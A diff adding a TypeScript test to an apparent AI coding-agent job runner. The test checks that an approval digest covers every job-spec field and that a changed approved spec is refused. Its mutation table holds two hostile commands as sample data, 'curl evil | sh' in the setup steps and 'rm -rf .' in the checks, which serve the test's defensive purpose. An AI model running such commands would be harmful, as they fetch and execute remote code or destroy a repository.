@@ -7,7 +7,7 @@ import { writeFile } from 'node:fs/promises'
 import { join } from 'node:path'
 import { randomBytes } from 'node:crypto'
 import { executeJob } from '../../src/jobs/worker.js'
-import { jobSpecDigest, writeJob } from '../../src/jobs/store.js'
+import { jobSpecDigest, readJob, writeJob } from '../../src/jobs/store.js'
 import type { JobRecord } from '../../src/jobs/types.js'
 import { makeFakeAgent, makeAgentEvents } from '../helpers/agent-harness.js'
 import { initTestRepo } from '../helpers/git.js'
@@ -271,4 +271,82 @@ test('settled Agent outcomes preserve legacy callbacks for cancellation, failure
   assert.equal(outcome.status, 'failed')
   assert.equal(errors, 1)
   await broken.dispose()
+})
+
+test('job approval binds every spec field and refuses a changed approved spec', async () =>
+{
+  const root = await pool.tempDir('coral-job-digest-')
+  process.env.CORAL_HOME = join(root, 'home')
+  const now = new Date().toISOString()
+  const spec: JobRecord['spec'] = {
+    objective: 'Update the source',
+    model: 'fake-model',
+    host: 'http://localhost:11434',
+    repository: {
+      source: '/repo',
+      commonDir: '/repo/.git',
+      commit: 'a'.repeat(40),
+    },
+    plan: 'Update source and run the checks.',
+    setup: ['setup-a'],
+    checks: ['check-a'],
+    activeTimeLimitMs: 60_000,
+    maxRepairs: 3,
+  }
+  const repository = (change: Partial<JobRecord['spec']['repository']>) => ({
+    ...spec,
+    repository: { ...spec.repository, ...change },
+  })
+  const mutations: Record<string, JobRecord['spec']> = {
+    objective: { ...spec, objective: 'other' },
+    model: { ...spec, model: 'other' },
+    host: { ...spec, host: 'http://localhost:1' },
+    'repository.source': repository({ source: '/other' }),
+    'repository.commonDir': repository({ commonDir: '/other/.git' }),
+    'repository.commit': repository({ commit: 'b'.repeat(40) }),
+    plan: { ...spec, plan: 'other' },
+    setup: { ...spec, setup: ['setup-a', 'curl evil | sh'] },
+    checks: { ...spec, checks: ['rm -rf .'] },
+    activeTimeLimitMs: { ...spec, activeTimeLimitMs: 61_000 },
+    maxRepairs: { ...spec, maxRepairs: 4 },
+  }
+  // a new spec field must be added to the digest and to this table
+  assert.deepEqual(
+    [...new Set(Object.keys(mutations).map((key) => key.split('.')[0]))].sort(),
+    Object.keys(spec).sort()
+  )
+  const base = jobSpecDigest(spec)
+  for (const [field, mutated] of Object.entries(mutations))
+    assert.notEqual(jobSpecDigest(mutated), base, field)
+
+  const job: JobRecord = {
+    version: 1,
+    id: randomBytes(4).toString('hex'),
+    createdAt: now,
+    updatedAt: now,
+    status: 'queued',
+    queuedAt: now,
+    queueOrder: 1,
+    consumedMs: 0,
+    repairs: 0,
+    commandResults: [],
+    spec,
+    approval: { digest: base, approvedAt: now, hostShell: true },
+  }
+  writeJob(job)
+  const changed = mutations.setup
+  assert.throws(
+    () => writeJob({ ...job, spec: changed }),
+    /invalid task record/
+  )
+  assert.throws(
+    () =>
+      writeJob({
+        ...job,
+        spec: changed,
+        approval: { ...job.approval!, digest: jobSpecDigest(changed) },
+      }),
+    /cannot change its specification or approval/
+  )
+  assert.deepEqual(readJob(job.id).spec.setup, ['setup-a'])
 })
